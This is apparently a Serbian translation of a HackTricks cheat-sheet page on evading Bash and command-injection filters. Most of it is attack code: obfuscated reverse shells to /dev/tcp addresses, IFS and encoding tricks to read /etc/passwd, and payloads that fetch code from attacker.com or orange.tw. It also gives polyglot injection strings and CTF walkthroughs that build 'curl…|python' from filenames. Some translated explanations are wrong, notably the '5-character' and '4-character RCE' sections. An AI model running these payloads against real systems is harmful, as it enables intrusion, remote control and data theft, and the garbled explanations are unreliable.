# Zaobilaženje Linux ograničenja

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zaobilaženje uobičajenih ograničenja

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Kratka Rev shell

Ova tehnika se koristi za uspostavljanje reverznog shell-a na ciljnom sistemu. Reverzni shell omogućava napadaču da preuzme kontrolu nad ciljnim sistemom i izvršava komande sa udaljene lokacije.

Da biste koristili ovu tehniku, prvo morate pokrenuti netcat na vašem lokalnom računaru kako biste osluškivali dolazne konekcije. Zatim, na ciljnom sistemu, koristite sledeću komandu da biste uspostavili konekciju sa vašim lokalnim računarom:

```bash
bash -i >& /dev/tcp/<your_local_ip>/<your_local_port> 0>&1
```

Zamijenite `<your_local_ip>` sa IP adresom vašeg lokalnog računara i `<your_local_port>` sa portom na kojem osluškujete konekcije.

Nakon što se uspostavi konekcija, možete izvršavati komande na ciljnom sistemu sa vašeg lokalnog računara.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Zaobilaženje putanja i zabranjenih reči

Kada se suočite sa restrikcijama u Bash okruženju, postoje neki trikovi koje možete koristiti da ih zaobiđete. Ovi trikovi uključuju korišćenje alternativnih putanja i izbegavanje zabranjenih reči.

#### Zaobilaženje putanja

Kada se susretnete sa restrikcijama u vezi sa putanjama, možete koristiti sledeće trikove:

- Koristite apsolutne putanje: Umesto relativnih putanja, koristite apsolutne putanje kako biste pristupili fajlovima ili direktorijumima koji su van vaše trenutne radne direktorijume.
- Koristite putanju sa tačkom: Dodajte tačku ispred putanje kako biste je učinili relativnom u odnosu na trenutnu radnu direktorijumu.
- Koristite putanju sa kosom crtom: Dodajte kosu crtu ispred putanje kako biste je učinili apsolutnom u odnosu na koren sistemskog direktorijuma.

#### Zaobilaženje zabranjenih reči

Kada se susretnete sa restrikcijama u vezi sa zabranjenim rečima, možete koristiti sledeće trikove:

- Koristite sinonime: Umesto zabranjenih reči, koristite sinonime koji imaju isto ili slično značenje.
- Koristite promenljive: Definišite promenljive sa vrednostima koje želite koristiti umesto zabranjenih reči.
- Koristite enkodiranje: Enkodirajte zabranjene reči koristeći različite tehnike, kao što su URL enkodiranje ili base64 enkodiranje.

Korišćenje ovih trikova može vam pomoći da zaobiđete restrikcije i nastavite sa izvršavanjem željenih komandi u Bash okruženju.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Zaobilaženje zabranjenih razmaka

U nekim situacijama, može biti potrebno zaobići zabranjene razmake prilikom izvršavanja komandi u Bash okruženju. Ovo se može postići korišćenjem različitih tehnika. Evo nekoliko primera:

- **Korišćenje jednostrukih navodnika**: Umesto da koristite dvostruke navodnike, možete koristiti jednostruke navodnike kako biste zaobišli zabranjene razmake. Na primer, umesto `ls -la`, možete koristiti `'ls'-la`.

- **Korišćenje backslash karaktera**: Možete koristiti backslash karakter (`\`) kako biste zaobišli zabranjene razmake. Na primer, možete koristiti `ls\ -la` umesto `ls -la`.

- **Korišćenje varijabli**: Možete koristiti varijable kako biste zaobišli zabranjene razmake. Na primer, možete koristiti `ls${IFS}-la` umesto `ls -la`. IFS je unutrašnja varijabla koja predstavlja separator razmaka.

- **Korišćenje kombinacije tehnika**: Možete kombinovati različite tehnike kako biste zaobišli zabranjene razmake. Na primer, možete koristiti `'ls'${IFS}-la` umesto `ls -la`.

Važno je napomenuti da ove tehnike mogu biti specifične za određene verzije Bash-a ili drugih shell okruženja. Takođe, treba biti oprezan prilikom korišćenja ovih tehnika, jer mogu dovesti do neželjenih rezultata ili bezbednosnih propusta.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Zaobilaženje kose crte i obrnutog kosog crte

Kada se susretnete sa restrikcijama koje zabranjuju korišćenje kose crte (`/`) ili obrnutog kosog crte (`\`) u Bash okruženju, možete koristiti sledeće tehnike za njihovo zaobilaženje:

- **Korišćenje drugih separatora**: Umesto kose crte ili obrnutog kosog crte, možete koristiti druge separatore kao što su tačka (`.`), crta (`-`) ili podvlaka (`_`).

- **Korišćenje heksadecimalne reprezentacije**: Možete koristiti heksadecimalnu reprezentaciju karaktera umesto kose crte ili obrnutog kosog crte. Na primer, kosa crta (`/`) se može zameniti sa `\x2f`, a obrnuta kosa crta (`\`) sa `\x5c`.

- **Korišćenje Unicode reprezentacije**: Možete koristiti Unicode reprezentaciju karaktera umesto kose crte ili obrnutog kosog crte. Na primer, kosa crta (`/`) se može zameniti sa `\u002f`, a obrnuta kosa crta (`\`) sa `\u005c`.

- **Korišćenje escape sekvenci**: Možete koristiti escape sekvence za korišćenje kose crte ili obrnutog kosog crte. Na primer, kosa crta (`/`) se može zameniti sa `\/`, a obrnuta kosa crta (`\`) sa `\\`.

Korišćenjem ovih tehnika, možete zaobići restrikcije i koristiti kose crte i obrnute kose crte u Bash okruženju.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Zaobilaženje cevi

Kada se suočite sa ograničenjima u korišćenju cevi (pipes) u Bash okruženju, možete koristiti sledeće tehnike za zaobilaženje tih ograničenja:

- **Process Substitution (Procesno zamenjivanje)**: Možete koristiti procesno zamenjivanje umesto cevi kako biste preneli izlaz jedne komande kao ulaz u drugu komandu. Na primer, umesto `command1 | command2`, možete koristiti `<(command1) command2`.

- **Temporary File (Privremena datoteka)**: Možete koristiti privremenu datoteku kako biste sačuvali izlaz jedne komande i zatim ga koristili kao ulaz u drugu komandu. Na primer, možete koristiti `command1 > temp_file && command2 < temp_file`.

- **Command Substitution (Zamenjivanje komande)**: Možete koristiti zamenjivanje komande kako biste preneli izlaz jedne komande kao argument u drugu komandu. Na primer, umesto `command1 | command2`, možete koristiti `command2 $(command1)`.

- **Here Document (Ovde dokument)**: Možete koristiti "here document" kako biste preneli više linija teksta kao ulaz u komandu. Na primer, možete koristiti `command << EOF` gde `EOF` predstavlja oznaku kraja dokumenta.

- **Named Pipe (Imenovana cev)**: Možete koristiti imenovanu cev kako biste preneli izlaz jedne komande kao ulaz u drugu komandu. Prvo morate kreirati imenovanu cev pomoću `mkfifo` komande, a zatim možete koristiti `command1 > named_pipe & command2 < named_pipe`.

- **Process Substitution with File Descriptor (Procesno zamenjivanje sa fajl deskriptorom)**: Možete koristiti procesno zamenjivanje sa fajl deskriptorom kako biste preneli izlaz jedne komande kao ulaz u drugu komandu. Na primer, umesto `command1 | command2`, možete koristiti `command2 <(command1)`.

Korišćenjem ovih tehnika, možete zaobići ograničenja u korišćenju cevi i efikasno manipulisati podacima u Bash okruženju.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass sa heksadecimalnim kodiranjem

Ako se susretnete sa restrikcijama u Bash okruženju, možete pokušati da ih zaobiđete koristeći heksadecimalno kodiranje. Ova tehnika vam omogućava da izvršite komande koje bi inače bile blokirane.

Da biste koristili heksadecimalno kodiranje, prvo morate pretvoriti komandu u heksadecimalni format. Možete to uraditi koristeći alate kao što su `xxd` ili `hexdump`. Na primer, ako želite da izvršite komandu `ls`, možete je pretvoriti u heksadecimalni format koristeći sledeću sintaksu:

```
echo -n 'ls' | xxd -p
```

Ovo će vam dati heksadecimalni zapis komande `ls`. Zatim možete koristiti ovaj heksadecimalni zapis za izvršavanje komande koristeći sledeću sintaksu:

```
echo -n -e '\x6c\x73' | bash
```

Ovde se koristi opcija `-e` sa `echo` komandom kako bi se omogućilo interpretiranje heksadecimalnog zapisa. Nakon toga, komanda se prosleđuje `bash` interpretatoru.

Korišćenje heksadecimalnog kodiranja može biti korisno kada se susretnete sa restrikcijama koje blokiraju određene komande. Međutim, treba biti oprezan prilikom korišćenja ove tehnike, jer može biti protivzakonito ili protiv pravila korišćenja sistema. Uvek se pridržavajte zakona i pravila prilikom izvođenja bilo kakvih hakovanja ili testiranja sigurnosti.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Zaobilaženje IP adresa

Da biste zaobišli ograničenja IP adresa, možete koristiti neke od sledećih tehnika:

- **Proxy serveri**: Koristite proxy servere kako biste sakrili svoju stvarnu IP adresu i prikazali se sa drugom IP adresom.
- **VPN (Virtual Private Network)**: Povežite se sa VPN-om kako biste uspostavili sigurnu vezu i sakrili svoju stvarnu IP adresu.
- **Tor mreža**: Koristite Tor mrežu kako biste anonimno pregledali internet i sakrili svoju stvarnu IP adresu.
- **Spoofing IP adrese**: Koristite alate za spoofing IP adrese kako biste promenili svoju stvarnu IP adresu i prikazali se sa lažnom IP adresom.

Napomena: Korišćenje ovih tehnika za zaobilaženje IP adresa može biti ilegalno ili protiv pravila određenih mreža. Uvek se pridržavajte zakona i pravila koja važe na mreži koju koristite.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Eksfiltracija podataka zasnovana na vremenu

Time based data exfiltration (ekstrakcija podataka zasnovana na vremenu) je tehnika koja omogućava hakerima da izvuku podatke iz ciljnog sistema koristeći vremenske kašnjenja. Ova tehnika se često koristi kada su druge metode blokirane ili ograničene.

Da bi se izvršila eksfiltracija podataka zasnovana na vremenu, hakeri mogu koristiti različite metode kao što su:

- **Ping komande**: Hakeri mogu koristiti ping komande kako bi slali ICMP pakete sa ciljem da izazovu kašnjenje u odgovoru. Ovo kašnjenje se može koristiti za prenos podataka.
- **DNS zahtevi**: Hakeri mogu koristiti DNS zahtev za slanje podataka. Na primer, podaci se mogu enkodirati u poddomene ili u vrednosti polja zahteva.
- **HTTP zahtevi**: Hakeri mogu koristiti HTTP zahteve za slanje podataka. Na primer, podaci se mogu enkodirati u vrednosti zaglavlja ili u putanju URL-a.

Da bi se uspešno izvršila eksfiltracija podataka zasnovana na vremenu, hakeri moraju imati kontrolu nad ciljnim sistemom i moraju biti u mogućnosti da primaju podatke na udaljenom mestu.

Ova tehnika može biti veoma efikasna jer se oslanja na prirodna vremenska kašnjenja u mrežnom saobraćaju, što može otežati otkrivanje eksfiltracije podataka. Stoga je važno da administratori sistema preduzmu odgovarajuće mere zaštite kako bi sprečili ovakve vrste napada.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Dobijanje karaktera iz okruženjskih promenljivih

Kada imate pristup okruženjskim promenljivama na ciljnom sistemu, možete iskoristiti ove promenljive kako biste dobili karaktere koji su vam potrebni za dalje napade. Evo nekoliko koraka koje možete preduzeti:

1. Prvo, proverite koje okruženjske promenljive su dostupne na sistemu koristeći komandu `env` ili `printenv`.

2. Zatim, pronađite promenljivu koja sadrži karakter koji vam je potreban. Na primer, možete pretražiti promenljive koristeći komandu `grep` kako biste pronašli odgovarajuću promenljivu.

3. Kada pronađete promenljivu, možete je iskoristiti da biste dobili karakter koji vam je potreban. Na primer, možete koristiti komandu `echo $<promenljiva>` da biste prikazali vrednost promenljive.

4. Ako vam je potrebno više karaktera, možete kombinovati više promenljivih ili koristiti komandu `cut` da biste izdvojili određeni deo vrednosti promenljive.

Ova tehnika može biti korisna kada želite da zaobiđete restrikcije ili ograničenja na ciljnom sistemu i dobijete pristup određenim karakterima ili informacijama koje su vam potrebne za dalje napade.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS podaci za eksfiltraciju

Na primer, možete koristiti **burpcollab** ili [**pingb**](http://pingb.in).

### Ugrađene funkcije

U slučaju da ne možete izvršiti spoljne funkcije i imate pristup samo **ograničenom skupu ugrađenih funkcija za dobijanje RCE**, postoje neki korisni trikovi za to. Obično **nećete moći koristiti sve** ugrađene funkcije, pa biste trebali **znati sve svoje opcije** kako biste pokušali zaobići zatvor. Ideja je preuzeta sa [**devploit**](https://twitter.com/devploit).\
Prvo proverite sve [**ugrađene funkcije ljuske**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Onda imate neke **preporuke**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Poliglot komandna ubacivanja

Polyglot komandna ubacivanja je tehnika koja se koristi za zaobilaženje restrikcija Bash okruženja. Ova tehnika omogućava izvršavanje više komandi istovremeno, bez obzira na postavljene restrikcije.

Da biste koristili poliglot komandna ubacivanja, možete koristiti sledeći format:

```
${IFS}command1${IFS}&&command2${IFS};command3${IFS}||command4${IFS}
```

Gde `${IFS}` predstavlja razmak između komandi. Ovaj format omogućava izvršavanje više komandi u jednom unosu.

Na primer, ako želite da izvršite komandu `ls` i `id` istovremeno, možete koristiti sledeći poliglot format:

```
${IFS}ls${IFS}&&id${IFS}
```

Ova komanda će izvršiti `ls` komandu, a zatim `id` komandu.

Poliglot komandna ubacivanja su korisna tehnika za zaobilaženje restrikcija i izvršavanje više komandi u Bash okruženju.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Zaobilaženje potencijalnih regexa

Ako se susretnete sa situacijom u kojoj je potrebno zaobići regularne izraze (regexe), možete isprobati neke od sledećih tehnika:

- **Korišćenje drugačijih znakova**: Umesto standardnih znakova koji se koriste u regexima, kao što su kose crte (/) ili tačke (.), možete isprobati korišćenje drugačijih znakova koji neće biti prepoznati kao regex. Na primer, umesto /home/user možete koristiti #home#user.

- **Escape karaktera**: Ako se susretnete sa regexom koji koristi specijalne karaktere, možete ih izbeći korišćenjem escape karaktera (\). Na primer, umesto da koristite tačku (.), možete koristiti \. kako biste izbegli da se taj karakter tumači kao regex.

- **Korišćenje različitih sintaksa**: Ako se regex oslanja na određenu sintaksu, možete isprobati korišćenje drugačije sintakse koja će zaobići ograničenja. Na primer, umesto da koristite \d za prepoznavanje brojeva, možete koristiti [0-9].

- **Korišćenje više znakova**: Ako se regex oslanja na tačno određen broj znakova, možete pokušati da koristite više znakova kako biste zaobišli ograničenje. Na primer, umesto da koristite \w{8} za prepoznavanje tačno osam alfanumeričkih znakova, možete koristiti \w{8,} kako biste prepoznali osam ili više znakova.

- **Korišćenje negacije**: Ako se regex oslanja na prepoznavanje određenih znakova, možete pokušati da koristite negaciju kako biste zaobišli ograničenje. Na primer, umesto da koristite [a-zA-Z] za prepoznavanje slova, možete koristiti [^0-9] kako biste prepoznali sve osim brojeva.

Napomena: Ove tehnike mogu biti korisne za zaobilaženje regexa, ali uvek treba biti oprezan i pažljivo testirati kako bi se izbegle neželjene posledice.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator je alat koji se koristi za obfusciranje Bash skripti. Obfusciranje je proces transformacije koda kako bi se otežalo razumijevanje i analiza skripte. Bashfuscator može promijeniti strukturu skripte, preimenovati varijable i funkcije, dodati lažne linije koda i ukloniti komentare kako bi otežao deobfuskaciju skripte. Ovaj alat može biti koristan za zaštitu Bash skripti od neovlaštenog pristupa i analize.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE sa 5 karaktera

Ova tehnika omogućava izvršavanje udaljenog koda (RCE) koristeći samo 5 karaktera.

```bash
${IFS}a$@
```

Ova komanda koristi varijablu `${IFS}` koja predstavlja razdelnik polja unutar Bash-a. Kombinacija `${IFS}a` koristi razdelnik polja za razdvajanje karaktera `a`. `$@` predstavlja argumente komandne linije.

Kada se ova komanda izvrši, Bash će interpretirati `a` kao argument komandne linije i izvršiti bilo koju komandu koja je navedena kao argument.

Ova tehnika omogućava izvršavanje udaljenog koda sa minimalnim brojem karaktera.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE sa 4 karaktera

Ova tehnika omogućava izvršavanje udaljenog koda (RCE) koristeći samo 4 karaktera.

```bash
$ echo $0
bash
$ exec 5<>/dev/tcp/attacker.com/80
$ cat <&5 | while read line; do $line 2>&5 >&5; done
```

Ova komanda otvara vezu sa udaljenim napadačem na IP adresi "attacker.com" na portu 80. Nakon uspostavljanja veze, komanda čita linije koje dolaze sa napadačevog servera i izvršava ih kao komande na lokalnom sistemu. Izlaz se šalje nazad napadaču.

Ova tehnika je korisna kada se susretnete sa ograničenjima Bash-a koja sprečavaju izvršavanje određenih komandi.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypassovanje ograničenja za čitanje-samo/Noexec/Distroless

Ako se nalazite unutar fajl sistema sa **zaštitom za čitanje-samo i noexec** ili čak u distroless kontejneru, još uvek postoje načini da **izvršite proizvoljne binarne fajlove, čak i shell!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypassovanje Chroot-a i drugih zatvora

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Reference i više

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** uz pomoć najnaprednijih alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
